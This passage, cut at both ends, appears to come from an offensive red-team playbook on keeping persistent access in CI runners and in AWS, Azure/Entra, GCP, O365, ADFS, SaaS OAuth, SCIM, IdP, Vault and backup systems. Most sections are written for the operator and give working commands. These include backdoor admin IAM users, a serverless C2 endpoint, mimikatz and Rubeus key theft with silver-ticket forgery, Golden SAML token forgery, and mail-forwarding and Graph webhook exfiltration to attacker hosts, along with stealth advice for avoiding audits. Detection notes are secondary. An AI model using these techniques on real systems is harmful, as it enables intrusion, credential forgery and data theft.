OPSEC: HIGH against registries without provenance enforcement; MEDIUM
against mature shops with sigstore-verified charts + admission control.
```

### 13.7 — GitHub Actions Self-Hosted Runner Persistence (NEW)

```
═══════════════════════════════════════════════════════════
GITHUB ACTIONS SELF-HOSTED RUNNER — PERSISTENT EXECUTION CHANNEL
MITRE ATT&CK: T1543 (Create/Modify System Process — adjacent), T1199
STEALTH: MEDIUM (legitimate runner; persistent foothold)
SURVIVABILITY: Reboot ✓ Reimage ✗ (must re-register runner)
              Cred Rotation ✓ (runner uses its own registration token)
═══════════════════════════════════════════════════════════
(Cross-ref initial access §8.6 for delivery; here as persistent execution)

WHY THIS IS PERSISTENCE:
- Self-hosted runner registered to attacker-controlled IP/network
  becomes persistent execution channel for ANY workflow that matches
  runner labels
- Workflows triggered by PRs, scheduled cron, manual dispatch all
  execute on attacker infra
- Secrets injected as env vars are exfiltrated
- Build artifacts can be modified before publication (supply chain
  injection upstream)

ATTACK PATTERN:
1. Compromise GitHub org admin or repo with admin access
2. Register attacker-controlled self-hosted runner with broad labels
   (e.g., "ubuntu-latest" — picks up most workflows)
   ./config.sh --url https://github.com/<org>/<repo> \
              --token <REG_TOKEN> --labels ubuntu-latest,self-hosted
3. Runner polls GitHub for jobs; runs them on attacker infra
4. Each job execution = new opportunity to:
   - Exfiltrate GitHub Secrets injected as env vars
   - Modify built artifacts
   - Pivot via stolen tokens to dependent repos / cloud accounts
5. Attacker can also DELETE the runner registration after each run for
   cleanup, then re-register on demand

PERSISTENCE VALUE:
- Survives PAT rotation (runner has its own token)
- Cross-repo if attacker registers runner at org level
- Cross-cluster if multiple repos use shared runner labels
- Stealthy because runner is "legitimate" infrastructure from GH
  perspective

DEFENDER CONTROLS:
- GitHub Enterprise Cloud: actions/runner-controller enforces
  ephemeral runners (auto-delete after job)
- Disable self-hosted runners on public repos (Q4 2024 GH default)
- Runner registration token has limited lifetime
- Audit log: org/repo runner registrations

DETECTION:
- GitHub audit log: runner.added, runner.updated events
- Runner heartbeat from unexpected IP / region
- Workflow execution from runners not in expected pool

OPSEC: MEDIUM — runner registrations are auditable; defenders running
periodic runner-inventory diff catch this. High value when registered
to attacker-controlled persistent infrastructure.
```

```
═══════════════════════════════════════════════════════════
SECTION 13 — RELATED & FOLLOW-ON
═══════════════════════════════════════════════════════════
Enables → §9 Linux kernel (eBPF rootkits often deployed via K8s
          DaemonSet on nodes — LinkPro pattern)
Enables → §14 cloud (K8s SA token → cloud federation token)
Cross-ref → Initial access §8.6 CI/CD pipeline compromise (delivery)
Cross-ref → §6.4 / §10.4 / §11.10 Defender Stack references
NEVER → Run unmodified Cobalt Strike / Sliver / Mythic agent images on
        K8s deployment without YARA rule check first; default agents
        signatured
```

---

## 14 — CLOUD & IDENTITY-PLANE PERSISTENCE

### 14.1 — AWS — Extended

```bash
# ═══════════════════════════════════════════════════════════
# AWS PERSISTENCE — EXTENDED (with EventBridge + Lambda URL)
# MITRE ATT&CK: T1098.001 (Additional Cloud Credentials),
#               T1098.003 (Additional Cloud Roles)
# STEALTH: HIGH for legitimate-pattern persistence; LOW for
#          obvious "attacker" IAM creation
# ═══════════════════════════════════════════════════════════

# ─── IAM USER BACKDOOR ─────────────────────────────────────
aws iam create-user --user-name svc-cloudwatch-health
aws iam create-access-key --user-name svc-cloudwatch-health
aws iam attach-user-policy --user-name svc-cloudwatch-health \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
# OPSEC: Use realistic name (svc-*, monitoring-*, backup-*); attach
# inline policy instead of AdministratorAccess (less obvious in IAM audit)

# ─── IAM ROLE CROSS-ACCOUNT TRUST ──────────────────────────
# Add attacker AWS account as trusted entity on existing role:
# Modify trust policy:
# {"Effect":"Allow","Principal":{"AWS":"arn:aws:iam::ATTACKER_ACCT:root"},"Action":"sts:AssumeRole"}
# Attacker can now assume role from their own account

# ─── ACCESS KEY ON EXISTING USER ───────────────────────────
aws iam create-access-key --user-name existing-service-account
# Generates second access key pair — user can have up to 2
# Original key still works — may not be noticed

# ─── LAMBDA + EVENTBRIDGE PERSISTENCE (cross-ref initial access §7.1) ─
# Create Lambda triggered by EventBridge schedule
aws events put-rule --name "health-check" --schedule-expression "rate(30 minutes)"
aws lambda create-function --function-name health-check \
  --runtime python3.12 --handler lambda_function.handler \
  --role arn:aws:iam::ACCT:role/lambda-exec --zip-file fileb://beacon.zip
aws events put-targets --rule "health-check" \
  --targets "Id"="1","Arn"="arn:aws:lambda:REGION:ACCT:function:health-check"

# Even more pernicious: Lambda Function URL (no API Gateway needed):
aws lambda create-function-url-config --function-name health-check \
  --auth-type NONE
# Returns URL: https://<url-id>.lambda-url.<region>.on.aws/
# Persistent serverless C2 endpoint — outbound from target's AWS account
# (looks like legitimate target traffic to defenders)

# ─── SSM DOCUMENT PERSISTENCE ──────────────────────────────
# Create SSM command document → run on managed EC2 instances
# SSM documents run as root/SYSTEM on target instances
aws ssm create-document --name "HealthCheck" --content file://doc.json \
  --document-type "Command"
aws ssm send-command --document-name "HealthCheck" \
  --targets "Key=tag:Environment,Values=Prod"

# ─── EC2 USER DATA ─────────────────────────────────────────
# IMPORTANT: cloud-init only executes user-data on FIRST boot by default
# Modifying user-data via API does NOT cause re-execution on next start.
# To execute on every boot: wrap in MIME multipart with
# Content-Type: text/x-shellscript and configure cloud-init for "always"
# Alternatively use user-data to install systemd service or cron (more reliable)
aws ec2 stop-instances --instance-ids i-xxx
aws ec2 modify-instance-attribute --instance-id i-xxx \
  --user-data "IyEvYmluL2Jhc2gKL29wdC8uY2FjaGUvc2Vzc2lvbi1tZ3IgJg=="
aws ec2 start-instances --instance-ids i-xxx

# ─── S3 EVENT NOTIFICATION ─────────────────────────────────
# Trigger Lambda on S3 bucket events → executes when files uploaded

# ─── CLOUDFORMATION STACK / SCP MANIPULATION ───────────────
# Modify org-level SCP to permit attacker-controlled identity
# Persistent organization-wide policy exception
aws organizations describe-policy --policy-id <id>

# DETECTION:
# - CloudTrail (CreateUser, CreateAccessKey, PutRolePolicy,
#   CreateFunction, CreateFunctionUrlConfig, PutRule, PutTargets)
# - IAM Access Analyzer
# - Unused credential reports
# - GuardDuty malicious-IP communication on Lambda Function URL endpoints

# OPSEC: Use existing roles/users where possible instead of creating new
```

### 14.2 — Azure / Entra ID — Extended (FIC + PIM + Cross-Tenant)

```bash
# ═══════════════════════════════════════════════════════════
# AZURE / ENTRA ID PERSISTENCE — EXTENDED
# MITRE ATT&CK: T1098.001, T1098.003, T1556 (Modify Auth Process)
# ═══════════════════════════════════════════════════════════

# ─── SERVICE PRINCIPAL / APP REGISTRATION ──────────────────
az ad sp create-for-rbac --name "svc-health-monitor" --role Contributor --scopes /subscriptions/SUB_ID
# Creates app + service principal + client secret
# Client secret usable for non-interactive auth

# ─── ADD CREDENTIALS TO EXISTING APP (less visible than new app) ──
az ad app credential reset --id APP_ID --append
# Existing secrets continue working — new one added alongside

# ★ FEDERATED IDENTITY CREDENTIAL (FIC) ON MANAGED IDENTITY (M10):
#   Persistence WITHOUT on-tenant secret storage
#   Source: https://learn.microsoft.com/en-us/entra/workload-id/workload-identity-federation-create-trust-user-assigned-managed-identity
# Instead of client secret: federate managed identity or app registration
# with EXTERNAL OIDC issuer (including attacker-controlled). External
# tokens from that issuer exchange for Entra access tokens — NO secret
# stored in Entra.
az identity federated-credential create --name atk-fic \
  --identity-name svc-identity --resource-group rg \
  --issuer https://attacker.oidc.example/ --subject system:any
# Maximum 20 FICs per identity (operator should occupy multiple slots
# for redundancy). Leaves MINIMAL on-tenant secret footprint; harder to
# rotate out than secrets.

# OPSEC ADVANTAGES:
# - No secret to leak
# - Defender for Cloud Apps secret-scanner does not detect (no secret)
# - Only audit trail is the FIC creation event itself

# ★ DEFENDER CONTROLS:
# - Azure Policy deny-list for FIC creation by non-allowlisted identities
# - Audit alert on federatedIdentityCredentials creation (Q1 2026 added
#   to MDCA Identity SaaS Posture Management)
# - Maximum 20 FICs per identity (resource limit)

# ─── AUTOMATION ACCOUNT RUNBOOK ────────────────────────────
# Create Azure Automation runbook → runs on schedule with Managed Identity
# Runbook has access to whatever Managed Identity is granted
# Executes PowerShell/Python in Azure sandbox — persistent scheduled exec

# ─── LOGIC APP / FUNCTION APP ──────────────────────────────
# Timer-triggered Function App → beacon to C2
# Logic App with recurrence trigger → HTTP action to C2
# Both run serverless, persist indefinitely

# ─── MANAGED IDENTITY ABUSE ────────────────────────────────
# If VM has Managed Identity with broad permissions:
# Tokens requestable from within VM at any time
curl -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?resource=https://management.azure.com/&api-version=2019-08-01"

# ─── PIM ELEVATION ABUSE ───────────────────────────────────
# Privileged Identity Management eligible-role grant = persistent path
# to elevation
# Add user as PIM-eligible (not active) for sensitive role
az role assignment create --assignee <user> --role "Privileged Role Administrator"
# User can ACTIVATE elevation at any time without separate auth

# ─── CROSS-TENANT ACCESS POLICY ABUSE (Storm-0501 pattern) ─
# Modify cross-tenant access policy to permit B2B from attacker-tenant
# without MFA / device-compliance requirements
# Compromised partner tenant + permissive cross-tenant policy:
# - Attacker auth to partner tenant via own creds
# - Cross-tenant sync may push attacker identity into target tenant
# - Persistent cross-tenant pivot path
Get-MgPolicyCrossTenantAccessPolicyDefault
Get-MgPolicyCrossTenantAccessPolicyPartner

# DETECTION:
# - Entra audit log: app credential changes, FIC creation
# - Defender for Cloud Apps OAuth app monitoring
# - Defender XDR cross-product correlation
# - PIM activation audit (Entra audit log "Activate role")
# - KQL hunt for FIC anomaly (see §6.3)

# OPSEC: Authenticated Entra activity FULLY LOGGED
```

```
═══════════════════════════════════════════════════════════
SECTION 14 (PART 1) — RELATED & FOLLOW-ON
═══════════════════════════════════════════════════════════
Continued in §14.3-14.10 (next chunk)
Cross-ref → §6.4 Defender Stack reference (cloud-side detection)
Cross-ref → Initial access §7 cloud + identity-plane initial access
```

### 14.3 — GCP — Extended

```bash
# ═══════════════════════════════════════════════════════════
# GCP PERSISTENCE
# MITRE ATT&CK: T1098.001, T1098.003
# ═══════════════════════════════════════════════════════════

# ─── SERVICE ACCOUNT KEY ───────────────────────────────────
gcloud iam service-accounts keys create key.json \
  --iam-account=svc-health@PROJECT.iam.gserviceaccount.com
# Exports JSON key file → persistent auth from anywhere

# ─── CLOUD FUNCTION ────────────────────────────────────────
gcloud functions deploy health-check --runtime python312 \
  --trigger-topic health-check --source ./function_src/
gcloud scheduler jobs create pubsub health-trigger \
  --schedule="*/30 * * * *" --topic=health-check --message-body="run"

# ─── COMPUTE ENGINE STARTUP SCRIPT ─────────────────────────
gcloud compute instances add-metadata INSTANCE \
  --metadata startup-script='#!/bin/bash
  /opt/.cache/session-mgr &'

# ─── IAM POLICY BINDING (cross-project persistence) ────────
gcloud projects add-iam-policy-binding PROJECT \
  --member="serviceAccount:attacker@ATTACKER-PROJECT.iam.gserviceaccount.com" \
  --role="roles/editor"
# Cross-project — attacker's SA has editor in victim project

# ─── WORKLOAD IDENTITY FEDERATION (parallels Azure FIC) ────
# Federate external OIDC issuer with GCP service account
# Tokens from external (attacker-controlled) issuer exchange for GCP
# access tokens — NO key stored in GCP
gcloud iam workload-identity-pools providers create-oidc <provider> \
  --workload-identity-pool=<pool> --location=global \
  --issuer-uri=https://attacker.oidc.example/

# ─── GKE WORKLOAD IDENTITY ABUSE ───────────────────────────
# K8s SA bound to GCP SA → cluster-side persistence with GCP API access

# ─── GOOGLE WORKSPACE ADMIN SDK ABUSE ──────────────────────
# Workspace super-admin → install marketplace app with broad scopes
# Modify domain-wide delegation
# Persistent OAuth app-level access surviving user-account changes

# DETECTION:
# - Cloud Audit Logs (Admin Activity always-on; Data Access opt-in)
# - IAM Recommender (unused permissions)
# - Key age reports
# - Security Command Center (SCC) Premium
```

### 14.4 — O365 / Entra ID Identity Layer

```powershell
# ═══════════════════════════════════════════════════════════
# O365 / ENTRA ID IDENTITY-LAYER PERSISTENCE
# MITRE ATT&CK: T1098, T1114.003 (Email Forwarding)
# ═══════════════════════════════════════════════════════════

# ─── MAIL FORWARDING RULE (T1114.003) ──────────────────────
New-InboxRule -Mailbox victim@target.com -Name "Health" -ForwardTo attacker@external.com -MarkAsRead $true
# Or via Graph API for stealth

# ─── TRANSPORT RULE (Exchange Admin — org-wide) ────────────
New-TransportRule -Name "Compliance Archive" -SentToScope InOrganization \
  -BlindCopyTo attacker@external.com -Priority 0
# BCC of all internal emails to attacker — org admin required

# ─── POWER AUTOMATE FLOW ───────────────────────────────────
# Create automated flow: trigger on new email → forward/copy to external
# Runs under user context, persists through password changes
# Survives MFA reset, password change — must explicitly delete flow
# Cross-ref initial access §2.5 OAuth consent for delivery

# ─── COMPLIANCE SEARCH / eDISCOVERY ────────────────────────
# If eDiscovery roles obtained: persistent search exporting data
# Search runs on schedule, exports to attacker-controlled location

# ─── CONDITIONAL ACCESS POLICY MANIPULATION ────────────────
# If Global Admin: create CA policy excluding attacker account from MFA
# Or trust attacker IP as "named location" → bypasses CA

# DETECTION: O365 UAL, Exchange message trace, Power Automate audit,
#            Defender for Cloud Apps, Entra sign-in anomalies
```

### 14.5 — Hybrid Identity — AZUREADSSOACC$ (Seamless SSO)

```
═══════════════════════════════════════════════════════════
AZUREADSSOACC$ BACKDOOR — DEFINING MODERN HYBRID-IDENTITY PERSISTENCE
MITRE ATT&CK: T1556 (Modify Auth Process), T1558.001 (Golden Ticket variant)
STEALTH: HIGH (forged tickets appear legitimate to Entra)
SURVIVABILITY: Reboot ✓ Reimage ✓ (if AZUREADSSOACC$ key not rotated)
              Cred Rotation ✓ (until Update-AzureADSSOForest run 2x)
CLEANUP COST: VERY HIGH (key rotation 2x with 10+ hour wait between)
═══════════════════════════════════════════════════════════

Any Entra Connect deployment with Seamless SSO enabled creates a
computer account in on-prem AD whose Kerberos decryption key is shared
with Entra ID. Compromise of this key allows attacker to forge Kerberos
tickets that Entra ID accepts as authentication for any user — without
knowing user password, without MFA, without triggering cloud telemetry.

MECHANISM:
1. Seamless SSO enabled → Entra Connect creates AZUREADSSOACC computer
   account in on-prem AD per synchronized forest, with Kerberos
   decryption key shared with Microsoft Entra
2. User in corporate network accesses O365 / Entra-backed apps → browser
   requests Kerberos ticket for HTTP/autologon.microsoftazuread-sso.com
   (represented by AZUREADSSOACC account). On-prem DC issues ticket
   encrypted with AZUREADSSOACC$'s Kerberos key.
3. Browser forwards ticket to Entra ID; Entra decrypts with shared key
   and issues SAML/OAuth2 tokens
4. Attacker with AZUREADSSOACC$ key can forge step 2 for ANY user — Entra
   accepts ticket because encrypted with correct key, issues tokens as
   if user authenticated legitimately

PREREQUISITES:
- Domain Admin / DCSync rights OR direct compromise of DC
- Seamless SSO configured in tenant (confirm via rpcclient or by
  AZUREADSSOACC$ account existence in Computers container)
- Network reachability to on-prem DC

EXECUTION:
# 1. Confirm Seamless SSO + extract account hash
impacket-secretsdump -just-dc-user 'AZUREADSSOACC$' target.local/admin@DC01

# Or from lsass on DC:
mimikatz # privilege::debug
mimikatz # lsadump::secrets /name:AZUREADSSOACC$
# Extracts account's AES256/AES128/RC4 Kerberos keys

# 2. Forge Kerberos ticket as AZUREADSSOACC$ for any target user
Rubeus.exe silverticket /service:HTTP/autologon.microsoftazuread-sso.com \
  /user:victim /domain:target.local /sid:S-1-5-21-... \
  /aes256:<AZUREADSSOACC_KEY> /ldap /nowrap

# 3. Inject ticket into session, access Entra-protected resources as
#    impersonated user. Entra treats as legitimate Seamless SSO; no risk
#    signal raised. Conditional Access evaluates as trusted auth.

CONDITIONAL ACCESS BYPASS:
- Seamless SSO-based auth appears as coming from on-prem corp network
  to Entra. CA policies trusting corporate IPs as "compliant network"
  evaluate forged session as trusted unless device-compliance separately
  required.
- CA policies requiring MFA bypassed because Seamless SSO is silent path
- Policies requiring compliant/Entra-joined device CAN still block

PERSISTENCE VALUE:
- Microsoft recommends rotating AZUREADSSOACC$ key every 30 days — most
  orgs do NOT do this. Stolen keys often valid months to years.
  Source: https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/how-to-connect-sso-how-it-works
- Survives: on-prem AD remediation that does not include explicit
  AZUREADSSOACC$ key rotation. Common remediation gap; IR teams focused
  on krbtgt rotation often miss this.
- Does NOT survive: explicit rollover via Azure AD PowerShell module
  (Update-AzureADSSOForest)

DETECTION:
- Event ID 4769 on DCs with ServiceName=AZUREADSSOACC$ from unexpected
  client IPs, unusual user principals, anomalous encryption types
  (RC4 on AES-only domain). KQL in §6.3.
- Entra sign-in logs: sign-ins with auth protocol "Kerberos" from
  unexpected IPs or unusual times for user
- MDI: DCSync from unexpected source (catches hash-extraction step)

ERADICATION (non-negotiable after compromise):
1. Rotate AZUREADSSOACC$ key:
   Import-Module "C:\Program Files\Microsoft Azure AD Connect\AzureADSSO.psd1"
   New-AzureADSSOAuthenticationContext
   Update-AzureADSSOForest -OnPremCredentials (Get-Credential)
   # Must run TWICE to fully invalidate cached tickets, 10+ hours apart
2. If migration possible: disable Seamless SSO entirely; migrate to WHfB
   / Entra-joined devices with modern auth (Microsoft deprecating
   Seamless SSO guidance through 2024-2025)
3. Audit Entra sign-in logs for 90+ days for suspicious Kerberos-protocol
   auths

OPSEC: HIGH — forged tickets appear legitimate to Entra; do not trigger
user-facing risk signals. Detection depends on on-prem DC audit + Entra
sign-in correlation.
```

### 14.6 — Hybrid Identity — ADFS Golden SAML

```
═══════════════════════════════════════════════════════════
ADFS GOLDEN SAML — TOKEN SIGNING CERT FORGERY
MITRE ATT&CK: T1606.002 (Forge Web Credentials: SAML Tokens)
STEALTH: VERY HIGH (forged tokens cryptographically identical to legit)
SURVIVABILITY: Survives password resets, MFA resets, account disables
              on impersonated user
CLEANUP COST: VERY HIGH (rotate TSC + revoke sessions + audit federated)
═══════════════════════════════════════════════════════════

For tenants using ADFS federation (still common in large enterprises):
compromise of ADFS Token Signing Certificate (TSC) private key allows
forgery of SAML tokens accepted by Entra/O365 as legitimate auth for
any user. SolarWinds/UNC2452 made this widely known; remains viable.

MECHANISM:
- ADFS signs SAML tokens with Token Signing Certificate (TSC). Entra
  trusts TSC as configured in federated domain settings.
- With TSC private key, attacker generates valid SAML tokens offline
  for arbitrary users.
- ADFS does NOT know tokens were forged — no ADFS authentication event
  generated, because token is minted outside ADFS entirely.

PREREQUISITES:
- SYSTEM on ADFS server, OR access to ADFS config database + DKM
  (Distributed Key Manager) master key from on-prem AD.
- AADInternals / ADFSDump / Rubeus for extraction; AADInternals
  Open-AADIntOffice365Portal for token forgery.

EXTRACTION:
# From ADFS server:
Import-Module AADInternals
Export-AADIntADFSSigningCertificate  # extracts TSC private key

# From offline AD forest backup:
Export-AADIntADFSConfiguration -Hash <DKM_hash>

FORGERY:
New-AADIntSAMLToken -UserName victim@target.com -Issuer "http://adfs.target.com/adfs/services/trust" -PfxFileName tsc.pfx -PfxPassword "..."

PERSISTENCE VALUE:
- Survives: password resets, MFA resets, account disables on impersonated
  user. Only invalidation is rotating TSC itself.
- Survives: on-prem AD remediation if TSC not rotated.
- Does NOT survive: ADFS TSC rotation + revocation in Entra federated
  domain settings.

DETECTION:
- Entra sign-in logs: auths from federated domain with NO corresponding
  ADFS event on ADFS server — requires correlation between cloud sign-in
  logs + on-prem ADFS auth logs
- Defender for Cloud Apps: "Activity from infrequent country" or
  "Impossible travel" on impersonated user
- Anomalous SAML tokens (unusual lifetime, anomalous claims) detectable
  in Entra sign-in log detail (AuthenticationDetails field)

ERADICATION:
1. Rotate ADFS Token Signing Certificate (current AND next)
2. Update federated domain in Entra to reflect new TSC
3. Revoke all existing sessions for federated users
4. Rotate ADFS service account + DKM master key if compromised
5. Consider migration from ADFS to Entra-managed authentication
   (Microsoft guiding customers off ADFS since 2023)

OPSEC: VERY HIGH — forged tokens cryptographically identical to legit
ADFS-issued tokens. Detection requires log correlation most orgs do not
perform.
```

### 14.7 — Microsoft Graph Subscriptions / Webhooks (NEW — M5)

```
═══════════════════════════════════════════════════════════
MICROSOFT GRAPH SUBSCRIPTIONS / CHANGE NOTIFICATIONS — PERSISTENT EXFIL
MITRE ATT&CK: T1114.003 (Email Forwarding — adjacent), T1098
STEALTH: HIGH (legitimate Graph subscription model)
SURVIVABILITY: Survives until subscription expires (default ~3 days,
              renewable indefinitely as long as access token valid)
CLEANUP COST: MEDIUM (delete subscription via Graph API)
═══════════════════════════════════════════════════════════

WHY THIS IS PERSISTENCE:
OAuth subscription with Mail.Read scope + webhook to attacker URL =
persistent data exfiltration WITHOUT polling. Every new email at the
target mailbox triggers webhook to attacker.

OAUTH SCOPES + ENDPOINT:
  Source: https://learn.microsoft.com/en-us/graph/change-notifications-overview

  Common persistent-exfil scopes:
  - Mail.Read           — every new email triggers webhook
  - Files.Read.All       — every new file event
  - Calendars.Read       — every calendar event change
  - Contacts.Read        — every contact addition
  - Chat.Read.All        — every Teams chat message (high-value)
  - Group.Read.All       — every group event

INSTALLATION:
# Operator has valid OAuth token with required scope (acquired via §2
# OAuth consent or §4.1 cookie replay or §7.5 post-foothold token theft)

# Create subscription:
curl -X POST "https://graph.microsoft.com/v1.0/subscriptions" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "changeType": "created,updated",
    "notificationUrl": "https://attacker-c2.example.com/webhook",
    "resource": "me/mailFolders('Inbox')/messages",
    "expirationDateTime": "2026-05-01T00:00:00Z",
    "clientState": "secretValue"
  }'

# Subscription expires per type:
#   Mail / Calendar / Contacts: max 3 days
#   Drive: max 30 days
#   Teams chat: max 60 minutes
#   Renew before expiration:
curl -X PATCH "https://graph.microsoft.com/v1.0/subscriptions/<sub-id>" \
  -d '{"expirationDateTime":"2026-05-04T00:00:00Z"}'

OPERATOR PATTERN:
- Subscribe to mailbox + Teams chat + Files
- Auto-renew via scheduled re-subscription (operator backend)
- Receive notifications at attacker webhook
- Notifications include just metadata (sender, subject, timestamp);
  to read content, attacker must use access token to GET the resource
- Persistent silent exfil channel surviving cookie / token refresh
- Subscription survives password changes IF the access token continues
  to refresh (CAE-eligible apps may revoke faster)

DETECTION:
- O365 Unified Audit Log: Subscription create events
- Defender for Cloud Apps: "Suspicious Graph subscription" (Q1 2026
  added to MDCA SaaS Security Posture Management)
- Anomalous webhook URLs (non-corp domain) in subscription audit
- Per-tenant subscription inventory diff vs baseline

DEFENDER CONTROLS:
- Conditional Access "Block delegated app permissions" for sensitive
  scopes
- Continuous Access Evaluation (CAE) — revokes refresh tokens on cred
  rotation, disabling subscription renewal
- Subscription audit playbook (Q2 2025 Microsoft published guidance)
- Defender XDR cross-product alert on subscription + outbound to
  unfamiliar domain

OPSEC: HIGH — silent exfil channel; defender attention shifts to
webhook URL anomaly detection.
```

### 14.8 — SaaS-to-SaaS OAuth Pivot Persistence (G7 — cross-ref initial access §7.6)

```
═══════════════════════════════════════════════════════════
SAAS-TO-SAAS OAUTH PIVOT PERSISTENCE
MITRE ATT&CK: T1550.001 (Application Access Token), T1199
STEALTH: VERY HIGH (legitimate OAuth grants between trusted SaaS)
SURVIVABILITY: As long as OAuth grants persist (months — until app
              consent revoked)
═══════════════════════════════════════════════════════════
(Cross-ref initial access §7.6 for mechanism + delivery)

PERSISTENCE PATTERN:
Compromise one SaaS (M365, Slack, Salesforce) → enumerate OAuth grants
for compromised user → pivot to other SaaS apps via OAuth refresh tokens.
Bypasses target's IdP because OAuth grants are direct app-to-app trust
relationships.

PERSISTENCE VALUE:
- Heavy-SaaS orgs (50-200 SaaS apps typical): wide attack surface
- OAuth refresh tokens often valid for 90+ days
- Cross-app pivot bypasses IdP cred rotation (each SaaS has own token
  refresh path)
- Cross-tenant app-to-app trust often not audited

ENUMERATION (post-foothold):
# After M365 foothold:
curl -s "https://graph.microsoft.com/v1.0/me/oauth2PermissionGrants" \
  -H "Authorization: Bearer $TOKEN"

# GraphRunner:
Invoke-DumpApps -Tokens $tokens

# Salesforce:
curl -s "https://target.my.salesforce.com/services/data/v60.0/sobjects/ConnectedApplication" \
  -H "Authorization: Bearer $SF_TOKEN"

PIVOT PATTERNS:
- M365 → Salesforce (OAuth grant for "Salesforce for Outlook")
- M365 → Atlassian (Atlassian Cloud SSO via Microsoft)
- M365 → GitHub Enterprise Cloud (SAML federation → repos via PAT/OAuth)
- Slack → ServiceNow (integration tokens for ticket creation)
- Workspace → Dropbox / Box (storage app integrations)

DETECTION:
- Defender for Cloud Apps: "Suspicious OAuth app activity" (Q1 2026)
- Per-SaaS audit logs (Salesforce Event Monitoring, Slack Audit Logs,
  GitHub Audit Log) — fragmented but correlatable via SIEM
- KQL hunt for cross-SaaS OAuth chain (initial access §10.6)

OPSEC: VERY HIGH — token-based requests appear as legitimate user
actions; cross-SaaS correlation requires mature SIEM.
```

### 14.9 — SCIM-Provisioned User Persistence (G15 — cross-ref initial access §7.7)

```
═══════════════════════════════════════════════════════════
SCIM-PROVISIONED USER PERSISTENCE
MITRE ATT&CK: T1136.003 (Create Account: Cloud Account), T1098
STEALTH: VERY HIGH (silent provisioning across federation)
SURVIVABILITY: Survives source-IdP password rotation (SCIM channel
              independent of source-IdP authentication)
CLEANUP COST: VERY HIGH (audit + remove provisioned user across all
              federated SaaS)
═══════════════════════════════════════════════════════════
(Cross-ref initial access §7.7 for mechanism + delivery)

PERSISTENCE VALUE:
- SCIM-provisioned attacker user survives IdP password rotation
- Provisioning channel is INDEPENDENT of source-IdP authentication
- Defender SaaS audit logs show user creation but source IdP shows no
  corresponding event — detection requires explicit cross-system
  correlation
- One SCIM token = persistent provisioning to ALL downstream SaaS using
  that SCIM endpoint

OPERATOR FOLLOWUP:
- After initial SCIM-provisioned account, periodically re-provision new
  attacker accounts via stolen SCIM token (defender removing one user
  doesn't kill the channel)
- Remove provisioning history via SCIM DELETE to clean trail

DETECTION:
- SaaS audit logs: user creation via SCIM endpoint vs IdP
- SIEM correlation: new SaaS user without IdP event
- SCIM token monitoring (rotation policies; inactive token alerts)
- CSPM: SCIM-related misconfig detection (Wiz / Vectra Identity)
```

### 14.10 — SSO IdP Admin Backdoor (G3) + HashiCorp Vault Root Token (G4)

```
═══════════════════════════════════════════════════════════
SSO IdP ADMIN BACKDOOR — TENANT-WIDE USER PERSISTENCE
MITRE ATT&CK: T1098, T1556 (Modify Auth Process)
STEALTH: HIGH (legitimate IdP admin actions)
═══════════════════════════════════════════════════════════
Compromise of SSO IdP admin (Okta admin / Auth0 admin / OneLogin admin)
enables PERSISTENT tenant-wide user-creation + policy modification.

PATTERNS:
- Register attacker-controlled IdP for federation (federation-trust
  backdoor)
- Modify SCIM provisioning (cross-ref §14.9)
- Inject attacker user into all federated apps simultaneously
- Modify Conditional Access / sign-on policies to bypass MFA for
  attacker accounts
- Disable security features (e.g., Okta Threat Insight, Auth0 anomaly
  detection)

PERSISTENCE VALUE:
- IdP admin compromise = persistent control of entire SSO surface
- Survives most user-account remediation (attacker has admin to
  re-create)
- Eradication requires IdP admin password reset + audit + revocation of
  all federation trusts created during compromise

DETECTION:
- IdP admin audit logs (Okta System Log, Auth0 Logs)
- Federation trust creation events
- Policy modification events
- Defender for Cloud Apps SSPM coverage

OPSEC: HIGH — IdP admin actions appear legitimate; defender attention
on admin-action audit log review (rare without SOAR automation).

═══════════════════════════════════════════════════════════
HASHICORP VAULT / AWS SECRETS MANAGER / AZURE KEY VAULT
═══════════════════════════════════════════════════════════
Compromise of secret-store admin or root token grants PERSISTENT access
to ALL stored secrets (database creds, cloud API keys, signing certs).

VAULT ROOT TOKEN:
- Vault root token = god-mode token; bypasses all policies
- Often present from initial deployment + never rotated
- Discovery: vault token lookup (current token), vault list auth
- Persistence: vault token create -policy=root -ttl=8760h (1 year)

AWS SECRETS MANAGER:
- aws secretsmanager list-secrets --max-results 100
- aws secretsmanager get-secret-value --secret-id <id>
- Persistent access via long-lived IAM access key on user with
  secretsmanager:GetSecretValue

AZURE KEY VAULT:
- az keyvault list
- az keyvault secret list --vault-name <vault>
- az keyvault secret show --vault-name <vault> --name <secret>
- Persistence via service principal with Key Vault reader role

DETECTION:
- Vault audit log (audit device must be enabled)
- AWS CloudTrail GetSecretValue events
- Azure Key Vault diagnostic logs (must be enabled)
- Defender for Key Vault flags anomalous access patterns
- Microsoft Defender for Cloud / Wiz / Lacework CSPM identify
  over-permissive secret access

OPSEC: VERY HIGH if secret-store audit not enabled (still common!);
detection significantly improved by Defender for Cloud + CSPM.
```

### 14.11 — Backup System Persistence (G5)

```
═══════════════════════════════════════════════════════════
BACKUP SYSTEM PERSISTENCE — VEEAM / COHESITY / RUBRIK / COMMVAULT
MITRE ATT&CK: T1565 (Data Manipulation — adjacent), T1078
STEALTH: HIGH (legitimate backup-system access channels)
SURVIVABILITY: Survives most remediation IF backup system access not
              audited; backup credentials persist beyond user changes
CLEANUP COST: VERY HIGH (full backup-system credential rotation +
              audit ALL restore operations)
═══════════════════════════════════════════════════════════

WHY BACKUP SYSTEMS ARE PERSISTENCE GOLD:
- Backup credentials grant RESTORE-AS-ANYONE capability
- Compromised Veeam / Cohesity / Rubrik / Commvault server = ability to:
  * Restore deleted user accounts (defender's "we removed the attacker
    account" remediation undone)
  * Restore deleted attacker persistence artifacts (registry keys, etc.)
  * Exfil entire enterprise data via legitimate backup-restore channel
- Backup APIs typically have broad cross-system credentials (database,
  SaaS, file system, AD) by design
- Top ransomware pivot 2024-2026 (cross-ref initial access §3.10
  active recon Veeam CVE matrix)

VEEAM CVE LANDSCAPE (cross-ref §5 initial access edge CVE matrix):
- CVE-2024-40711 — unauthenticated RCE (CVSS 9.8); exploited by Frag,
  Akira, Fog ransomware groups since Sept 2024
- CVE-2025-23120 — domain-joined Veeam server RCE; ANY domain user can
  exploit (CVSS 9.9); patched March 2025

PERSISTENCE PATTERNS:
1. Veeam Backup Server compromise:
